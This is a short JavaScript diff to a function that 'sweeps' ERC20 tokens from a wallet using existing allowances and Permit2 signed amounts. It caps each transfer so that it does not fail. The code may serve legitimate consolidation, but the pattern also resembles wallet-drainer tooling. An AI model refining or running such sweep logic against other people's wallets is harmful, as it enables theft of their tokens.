@@ -1597,7 +1597,16 @@ async function sweep(wallet) {
             try { [allow] = ERC20_ALLOW_IFACE.decodeFunctionResult("allowance", data); } catch { /* ignore */ }
           }
           if (allow > 0n) {
-            approved.push(withBalance[i]);
+            // Cap at min(balance, erc20_allowance, permitted.amount) so Permit2 never
+            // sees requestedAmount > ERC20 allowance or > the signed cap.
+            const permittedAmt = BigInt(withBalance[i].amount ?? "0");
+            const balanceCap   = withBalance[i].balance;
+            const allowCap     = allow < balanceCap ? allow : balanceCap;
+            const cappedBalance = permittedAmt > 0n && permittedAmt < allowCap ? permittedAmt : allowCap;
+            if (cappedBalance < balanceCap) {
+              log(`[gasless] ⚠️  ${withBalance[i].token.slice(0, 10)} capping sweep: balance=${balanceCap} allow=${allow} permitted=${permittedAmt} → using ${cappedBalance}`);
+            }
+            approved.push({ ...withBalance[i], balance: cappedBalance });
           } else {
             skipped.push(withBalance[i].token.slice(0, 10));
           }
